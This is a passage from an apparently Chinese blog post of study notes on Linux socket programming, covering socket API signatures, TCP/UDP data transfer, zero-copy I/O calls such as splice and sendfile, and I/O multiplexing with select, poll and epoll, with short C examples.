<span class="kt">int</span> <span class="nf">bind</span><span class="p">(</span><span class="kt">int</span> <span class="n">socket</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span> <span class="n">my_addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
<span class="cm">/*
  socket:创建socket返回的文件描述符
  my_addr:my_addr所指的socket地址
  addrlen:socket结构长度
  成功返回0，失败返回-1
*/</span>

<span class="c1">//6. 监听socket</span>
<span class="c1">//作用于服务端，监听socket所绑定的套接字</span>
<span class="kt">int</span> <span class="nf">listen</span><span class="p">(</span><span class="kt">int</span> <span class="n">socket</span><span class="p">,</span> <span class="kt">int</span> <span class="n">backlog</span><span class="p">);</span>
<span class="cm">/*
  socket:创建socket返回的文件描述符
  backlog表示队列最大的长度
  如果长度超过backlog，客户端会受到ECONNREFUSED错误信息
*/</span><span class="n">ok</span><span class="sc">'l'</span><span class="n">l</span>

<span class="c1">//7. 接受连接</span>
<span class="c1">//作用于服务端，响应连接请求，建立与Client连接</span>
<span class="kt">int</span> <span class="nf">accept</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span> <span class="n">addr</span><span class="p">,</span> <span class="n">socklen_t</span><span class="o">*</span> <span class="n">addrlen</span><span class="p">)</span>
<span class="cm">/*
  sockdf:创建socket返回的文件描述符
  addr:获取被接收的远程socket地址
  addrlen：addr长度
  成功返回用于和Client数据传输的文件描述符
*/</span>

<span class="c1">//8. 发起连接</span>
<span class="c1">//作用于Client程序，连接到某个服务端</span>
<span class="kt">int</span> <span class="n">connect</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span> <span class="n">serv_addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
<span class="cm">/*
  sockdf:创建socket返回的文件描述符
  serv_addr:被连接服务器信息
  addrlen:serv_addr长度
  成功返回0 失败返回-1
*/</span>

<span class="c1">//9. 关闭socket</span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">close</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">);</span>
<span class="c1">//并非立即关闭, 将socket的引用计数-1, 当fd的引用计数为0, 才是真正的关闭。(多进程fork调用会是父进程socket引用+1)</span>

<span class="c1">// 立即关闭</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="n">shutdown</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">howto</span><span class="p">)</span>
<span class="cm">/*
第二个参数为可选值 
  SHUT_RD 关闭读, socket的接收缓冲区的数据全部丢弃
  SHUT_WR 关闭写 socket的发送缓冲区全部在关闭前发送出去
  SHUT_RDWR 同时关闭读和写
  成功返回0 失败为-1 设置errno
*/</span>
</code></pre></div></div>

<h3 id="数据读写">数据读写</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. TCP数据读写</span>
<span class="cp">#include</span><span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="kt">ssize_t</span> <span class="nf">recv</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
<span class="cm">/*
  buf:指向接受信息的缓冲区指针
  len:buf缓冲区大小
  flags:一般设置为0，特殊情况查表
  返回成功接受的字节，0表示已关闭，失败返回-1
*/</span>
<span class="kt">ssize_t</span> <span class="nf">send</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
<span class="cm">/*
  buf:指向需要发送信息的缓冲区指针
  len:buf缓冲区大小
  flags:一般设置为0，特殊情况查表
  返回成功发送的字节数，失败返回-1
*/</span>

<span class="c1">//2. UDP数据读写  </span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="c1">// 由于UDP不保存状态, 每次发送数据都需要 加入目标地址.</span>
<span class="c1">// 如果实现有建立连接，把最后两项设为null，等同于TCP数据读写</span>
<span class="kt">ssize_t</span> <span class="nf">recvfrom</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span> <span class="n">src_addr</span><span class="p">,</span> <span class="n">socklen_t</span><span class="o">*</span> <span class="n">addrlen</span><span class="p">);</span>
<span class="kt">ssize_t</span> <span class="nf">sendto</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span><span class="o">*</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">ing</span> <span class="n">flags</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span> <span class="n">dest_addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>

<span class="c1">//3. 通用数据读写</span>
<span class="cp">#inclued &lt;sys/socket.h&gt;
</span><span class="kt">ssize_t</span> <span class="nf">recvmsg</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">msghdr</span><span class="o">*</span> <span class="n">msg</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
<span class="kt">ssize_t</span> <span class="nf">sendmsg</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">msghdr</span><span class="o">*</span> <span class="n">msg</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
<span class="c1">//msg参数是msghdr结构体类型的指针，msghdr结构体类型定义如下：</span>
<span class="k">struct</span> <span class="nc">msghdr</span>
<span class="p">{</span>
  <span class="c1">//指向socket地址结构变量, 对于TCP连接需要设置为NULL</span>
  <span class="kt">void</span><span class="o">*</span> <span class="n">msg_name</span><span class="p">;</span>                                            
  <span class="n">socklen_t</span> <span class="n">msg_namelen</span><span class="p">;</span>
	
<span class="cm">/*
  分散的内存块
  对于 recvmsg来说数据被读取后将存放在这里的块内存中, 内存的位置和长度由msg_iov指向的数组指定, 称为分散读(scatter read)
  对于sendmsg而言, msg_iovlen块的分散内存中的数据将一并发送称为集中写(gather write);
*/</span>
  <span class="k">struct</span> <span class="nc">iovec</span><span class="o">*</span> <span class="n">msg_iov</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">msg_iovlen</span><span class="p">;</span> <span class="cm">/* 分散内存块的数量*/</span>
  <span class="kt">void</span><span class="o">*</span> <span class="n">msg_control</span><span class="p">;</span> <span class="cm">/* 指向辅助数据的起始位置*/</span>
  <span class="n">socklen_t</span> <span class="n">msg_controllen</span><span class="p">;</span> <span class="cm">/* 辅助数据的大小*/</span>
  <span class="kt">int</span> <span class="n">msg_flags</span><span class="p">;</span> <span class="cm">/* 复制函数的flags参数, 并在调用过程中更新*/</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="nc">iovec</span>
<span class="p">{</span>
  <span class="kt">void</span><span class="o">*</span> <span class="n">iov_base</span> <span class="cm">/* 内存起始地址*/</span>
  <span class="kt">size_t</span> <span class="n">iov_len</span> <span class="cm">/* 这块内存长度*/</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="其他api">其他API</h3>

<h3 id="网络信息api">网络信息API</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. 获取主机信息</span>
<span class="cp">#include</span> <span class="cpf">&lt;netdb.h&gt;</span><span class="cp">
</span><span class="c1">//1.1 通过主机名获取主机信息</span>
<span class="k">struct</span> <span class="nc">hostent</span><span class="o">*</span> <span class="nf">gethostbyname</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">name</span><span class="p">);</span>

<span class="c1">//1.2 通过ip获取主机完整信息 </span>
<span class="k">struct</span> <span class="nc">hostent</span><span class="o">*</span> <span class="nf">gethostbyaddr</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span><span class="o">*</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">);</span>
<span class="c1">// type为IP地址类型 AF_INET和AF_INET6</span>

<span class="k">struct</span> <span class="nc">hostent</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">h_name</span><span class="p">;</span>			<span class="c1">//主机名</span>
  <span class="kt">char</span> <span class="o">**</span><span class="n">h_aliases</span><span class="p">;</span>		<span class="c1">//主机别名 可能有多个</span>
  <span class="kt">int</span> <span class="n">h_addrtype</span><span class="p">;</span>		<span class="c1">//地址组</span>
  <span class="kt">int</span> <span class="n">h_length</span><span class="p">;</span>			<span class="c1">//地址长度</span>
  <span class="kt">char</span> <span class="o">**</span><span class="n">h_addr_list</span><span class="p">;</span>		<span class="c1">//按网络字节序列出的主机IP地址列表</span>
<span class="p">}</span>

<span class="c1">//2. 获取服务信息</span>
<span class="cp">#include</span> <span class="cpf">&lt;netdb.h&gt;</span><span class="cp">
</span><span class="c1">//2.1 根据名称获取某个服务的完整信息</span>
<span class="k">struct</span> <span class="nc">servent</span> <span class="nf">getservbyname</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">name</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">proto</span><span class="p">);</span>
<span class="c1">//2.2 根据端口号获取服务信息</span>
<span class="k">struct</span> <span class="nc">servent</span> <span class="nf">getservbyport</span><span class="p">(</span><span class="kt">int</span> <span class="n">port</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">proto</span><span class="p">);</span>

<span class="k">struct</span> <span class="nc">servent</span>
<span class="p">{</span>
	<span class="kt">char</span><span class="o">*</span> <span class="n">s_name</span><span class="p">;</span> <span class="cm">/* 服务名称*/</span>
	<span class="kt">char</span> <span class="o">**</span> <span class="n">s_aliases</span><span class="p">;</span> <span class="cm">/* 服务的别名列表*/</span>
	<span class="kt">int</span> <span class="n">s_port</span><span class="p">;</span> <span class="cm">/* 端口号*/</span>
	<span class="kt">char</span><span class="o">*</span> <span class="n">s_proto</span><span class="p">;</span> <span class="cm">/* 服务类型, 通常为TCP或UDP*/</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="高级io函数">高级I/O函数</h2>

<p>不像基础I/O函数那么常用，但在特定的条件下却表现出优秀的性能。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//创建管道，实现进程间通讯</span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="c1">//从fd[1]写入的数据可以从fd[0]读出</span>
<span class="kt">int</span> <span class="nf">pipe</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

<span class="c1">//双向管道</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">socketpair</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

<span class="c1">//输入重定向</span>
<span class="c1">//复制一个现有的文件描述符，返回的文件描述符总是取系统当前可用的最小整数值</span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">dup</span><span class="p">(</span><span class="kt">int</span> <span class="n">oldfd</span><span class="p">);</span>

<span class="c1">//分散读和集中写</span>
<span class="kt">ssize_t</span> <span class="nf">readv</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">iovec</span><span class="o">*</span> <span class="n">vector</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">);</span>
<span class="kt">ssize_t</span> <span class="nf">writev</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">iovec</span><span class="o">*</span> <span class="n">vector</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">);</span>

<span class="k">struct</span> <span class="nc">iovec</span> <span class="p">{</span>
	<span class="kt">void</span><span class="o">*</span> <span class="n">iov_base</span> <span class="cm">/* 内存起始地址*/</span>
	<span class="kt">size_t</span> <span class="n">iov_len</span> <span class="cm">/* 这块内存长度*/</span>
<span class="p">}</span>

<span class="c1">//传输文件</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/sendfile.h&gt;</span><span class="cp">
</span><span class="c1">// offset为指定输入流从哪里开始读, 如果为NULL 则从开头读取</span>
<span class="kt">ssize_t</span> <span class="nf">sendfile</span><span class="p">(</span><span class="kt">int</span> <span class="n">out_fd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">in_fd</span><span class="p">,</span> <span class="kt">off_t</span><span class="o">*</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
<span class="c1">//可以使用writev发送文件，但是sendfile没有分配用户空间的缓存，也没有执行读取文件的操作，效率会高一些。</span>

<span class="c1">//两个文件描述符之间移动数据,零拷贝</span>
<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="kt">ssize_t</span> <span class="nf">splice</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd_in</span><span class="p">,</span> <span class="n">loff_t</span><span class="o">*</span> <span class="n">off_in</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd_out</span><span class="p">,</span> <span class="n">loff_t</span><span class="o">*</span> <span class="n">off_out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
<span class="c1">//举个例子 echo服务器</span>
<span class="kt">int</span> <span class="n">connfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">......;</span>
<span class="kt">int</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
<span class="c1">//把connfd上流入的客户端数据定向到管道</span>
<span class="n">splice</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">32768</span><span class="p">,</span> <span class="n">SPLICE_F_MORE</span> <span class="o">|</span> <span class="n">SPLICE_F_MOVE</span> <span class="p">);</span>
<span class="c1">//把管道的输出数据定向到connfd客户连接文件描述符</span>
<span class="n">splice</span><span class="p">(</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">connfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">32768</span><span class="p">,</span> <span class="n">SPLICE_F_MORE</span> <span class="o">|</span> <span class="n">SPLICE_F_MOVE</span> <span class="p">);</span>

<span class="c1">//tee也可以用作数据复制，不过只能用于管道文件描述符</span>
<span class="kt">ssize_t</span> <span class="nf">tee</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd_in</span><span class="p">,</span> <span class="n">loff_t</span><span class="o">*</span> <span class="n">off_in</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd_out</span><span class="p">,</span> <span class="n">loff_t</span><span class="o">*</span> <span class="n">off_out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="io复用">I/O复用</h2>

<p>I/O复用使得程序能同时监听多个文件描述符，通常网络程序在下列情况需要使用I/O复用技术。</p>

<ul>
  <li>客户端程序需要同时处理多个socket 非阻塞connect技术</li>
  <li>客户端程序同时处理用户输入和网络连接 聊天室程序</li>
  <li>TCP服务器要同时处理监听socket和连接socket</li>
  <li>同时处理TCP和UDP请求 - 回射服务器</li>
  <li>同时监听多个端口, 或者处理多种服务 - xinetd服务器</li>
</ul>

<p>Linux下实现I/O复用的系统屌用主要有<code class="language-plaintext highlighter-rouge">select</code>, <code class="language-plaintext highlighter-rouge">poll</code>, <code class="language-plaintext highlighter-rouge">epoll</code>。</p>

<p>其实在使用golang的过程中，很多函数都封装了I/O复用，只是我们没有深入到里面去理解。</p>

<h3 id="select">select</h3>

<p>select系统调用可监听算选的文件描述符，并根据文件描述符返回的  <strong>可读、可写、异常</strong> 等事件做出不同的回应。</p>

<p>一个例子，socket接受普通数据和外带数据都处于就绪态，但是前者是可读模式，后者是异常模式：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
	<span class="kt">int</span> <span class="n">connfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(...);</span>
    <span class="n">fd_set</span> <span class="n">read_fds</span><span class="p">;</span>
    <span class="n">fd_set</span> <span class="n">exception_fds</span><span class="p">;</span>

    <span class="n">FD_ZERO</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">read_fds</span> <span class="p">);</span>
    <span class="n">FD_ZERO</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">exception_fds</span> <span class="p">);</span>
    <span class="k">while</span><span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">buf</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">buf</span> <span class="p">)</span> <span class="p">);</span>
        <span class="c1">//每次select前为什么都要重新设置文件描述符</span>
        <span class="n">FD_SET</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">read_fds</span> <span class="p">);</span>
        <span class="n">FD_SET</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">exception_fds</span> <span class="p">);</span>

        <span class="n">ret</span> <span class="o">=</span> <span class="n">select</span><span class="p">(</span> <span class="n">connfd</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">read_fds</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">exception_fds</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span> <span class="s">"select one</span><span class="se">\n</span><span class="s">"</span> <span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span> <span class="s">"selection failure</span><span class="se">\n</span><span class="s">"</span> <span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
		<span class="c1">//可读模式</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">FD_ISSET</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">read_fds</span> <span class="p">)</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">buf</span> <span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span> <span class="p">);</span>
            <span class="k">if</span><span class="p">(</span> <span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
            <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">printf</span><span class="p">(</span> <span class="s">"get %d bytes of normal data: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">buf</span> <span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">//异常模式</span>
        <span class="k">else</span> <span class="k">if</span><span class="p">(</span> <span class="n">FD_ISSET</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">exception_fds</span> <span class="p">)</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">//使用外带数据的读取函数</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">buf</span> <span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">MSG_OOB</span> <span class="p">);</span>
            <span class="k">if</span><span class="p">(</span> <span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
            <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">printf</span><span class="p">(</span> <span class="s">"get %d bytes of oob data: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">buf</span> <span class="p">);</span>
        <span class="p">}</span>

    <span class="p">}</span>
</code></pre></div></div>

<p>针对上述例子分析：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//select调用原型</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/select.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">select</span> <span class="p">(</span><span class="kt">int</span> <span class="n">nfds</span><span class="p">,</span> <span class="n">fd_set</span><span class="o">*</span> <span class="n">readfds</span><span class="p">,</span> <span class="n">fd_set</span><span class="o">*</span> <span class="n">writefds</span><span class="p">,</span> <span class="n">fd_set</span><span class="o">*</span> <span class="n">exceptfds</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">timeval</span><span class="o">*</span> <span class="n">timeout</span><span class="p">);</span>
<span class="cm">/*
  nfds:被监听的文件描述符总数，通常是select监听的文件描述符最大值+1
  后三者分别对应可读、可写、异常文件描述符合集，内核通过修改它们来通知哪些文件描述符已就绪。
  timeval：select超时时间 如果传递0 则为非阻塞, 设置为NULL则为阻塞
*/</span>

<span class="c1">//fd_set结构体仅仅包含一个整形数组，该数组每个元素的每一位标记一个文件描述符</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/select.h&gt;</span><span class="cp">
</span><span class="n">FD_ZERO</span><span class="p">(</span><span class="n">fd_set</span> <span class="o">*</span><span class="n">fdset</span><span class="p">);</span>        <span class="c1">//清除fdset的所有位</span>
<span class="n">FD_SET</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span><span class="n">fd_set</span> <span class="o">*</span><span class="n">fdset</span><span class="p">);</span>  <span class="c1">//设置fdset的fd位</span>
<span class="n">FD_CLR</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span><span class="n">fd_set</span> <span class="o">*</span><span class="n">fdset</span><span class="p">);</span>  <span class="c1">//清除fdset的fd位</span>
<span class="kt">int</span> <span class="nf">FD_ISSET</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span><span class="n">fd_set</span> <span class="o">*</span><span class="n">fdset</span><span class="p">));</span><span class="err">、</span><span class="c1">//检查fdset的fd位是否被设置</span>

</code></pre></div></div>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FD_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">readset</span><span class="p">);</span>
<span class="n">FD_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">writeset</span><span class="p">);</span>
<span class="n">FD_SET</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readset</span><span class="p">);</span>
<span class="n">FD_SET</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readset</span><span class="p">);</span>
<span class="n">FD_SET</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">writeset</span><span class="p">);</span>
<span class="n">FD_SET</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">writeset</span><span class="p">);</span>
<span class="n">select</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">writeset</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>对应fd_set图：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002527.png" alt="image-20220423131007025" /></p>

<p>上面的例子刚开始我有两个疑问：</p>

<ol>
  <li>为什么select前都要重新设置文件描述符</li>
  <li>为什么select前设置了FD_SET，之后又用FD_ISSET判断</li>
</ol>

<p>原因其实就是事件发生后，会重新设置fd_set，没有事件发生的fd位会被清空。</p>

<p>有哪一些事件可以归于可读、可写、异常：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002533.png" alt="image-20220423132105311" /></p>

<h3 id="poll">poll</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">poll</span><span class="p">(</span><span class="k">struct</span> <span class="nc">pollfd</span><span class="o">*</span> <span class="n">fds</span><span class="p">,</span> <span class="n">nfds_t</span> <span class="n">nfds</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">);</span>
<span class="cm">/*
  fds: pollfd 结构体类型数组,指定文件描述符上发生的可读可写和异常事件
  nfds：被监听集合fds大小
  timeout 单位为毫秒 -1 为阻塞, 0 为立即返回
*/</span>
<span class="k">struct</span> <span class="nc">pollfd</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
	<span class="kt">short</span> <span class="n">events</span><span class="p">;</span>  <span class="c1">//注册的事件, 告知poll监听fd上的哪些事件</span>
	<span class="kt">short</span> <span class="n">revents</span><span class="p">;</span> <span class="c1">// 实际发生的事件</span>
<span class="p">}</span>
</code></pre></div></div>

<p>poll支持的事件类型：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002555.png" alt="image-20220423152027889" /></p>

<p>结合书上例子用poll写了一个聊天室，感觉用起来的确比select方便一些</p>

<h3 id="epoll">epoll</h3>

<p>epoll底层使用了红黑树，性能方面最好，相对而言也是用的最多的</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. 创建epoll实例，在内核中注册一个数据</span>
<span class="c1">//失败返回-1，成功返回epoll实例描述符</span>
<span class="kt">int</span> <span class="nf">epoll_create</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">);</span> <span class="c1">//自从Linux 2.6.8 size参数没有意义，但不能设置为0</span>

<span class="c1">//2. 操作epoll实例，对内核时间表进行增添、删除、修改操作</span>
<span class="kt">int</span> <span class="nf">epoll_ctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">epfd</span><span class="p">,</span><span class="kt">int</span> <span class="n">op</span><span class="p">,</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span><span class="k">struct</span> <span class="nc">epoll_event</span> <span class="o">*</span><span class="n">event</span><span class="p">);</span>
<span class="cm">/*
  epfd：epoll实例描述符
  fd: 要检测的文件描述符
  op：需要进行的操作：
  	EPOLL_CTL_ADD：添加
  	EPOLL_CTL_DEL：删除
  	EPOLL_CTL_MOD：修改
  event：检测文件描述符的具体事件
*/</span>
<span class="k">struct</span> <span class="nc">epoll_events</span>
<span class="p">{</span>
    <span class="n">_uint32_t</span> <span class="n">events</span><span class="p">;</span> <span class="c1">//epoll事件类型，和poll基本上类似，需要在poll的对应宏基础上加上‘E’，两个额外的事件类型EPOLLET和EPOLLONESHOT</span>
    <span class="n">epoll_data_t</span> <span class="n">data</span><span class="p">;</span><span class="c1">//union类型，其中的fd需要设置</span>
<span class="p">}</span>

<span class="c1">//3. 检测epoll实例</span>
<span class="c1">//成功已就绪的文件描述符个数，失败返回-1</span>
